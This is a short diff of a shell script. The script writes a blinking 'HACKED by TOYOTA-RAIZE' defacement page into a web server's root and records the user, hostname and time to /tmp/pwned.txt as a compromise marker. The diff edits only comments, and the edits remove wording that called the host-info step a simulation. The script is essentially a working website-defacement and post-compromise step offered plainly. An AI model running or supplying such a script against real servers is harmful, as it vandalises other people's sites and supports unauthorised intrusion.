@@ -16,12 +16,12 @@ body{margin:0;display:flex;justify-content:center;align-items:center;height:100v
 .blink{animation:blink 1s infinite}@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
 </style></head><body><div class="blink">HACKED by TOYOTA-RAIZE</div></body></html>" > /var/www/html/hacked.html
 
-# Capture basic host info (for simulation)
+#HOST-INFO
 echo "[+] Host Compromised" > /tmp/pwned.txt
 echo "User: $(whoami)" >> /tmp/pwned.txt
 echo "Hostname: $(hostname)" >> /tmp/pwned.txt
 echo "Time: $(date)" >> /tmp/pwned.txt
 echo "Marker page: /var/www/html/hacked.html" >> /tmp/pwned.txt
 
-# Optional: Print to screen
+#PRINT
 cat /tmp/pwned.txt
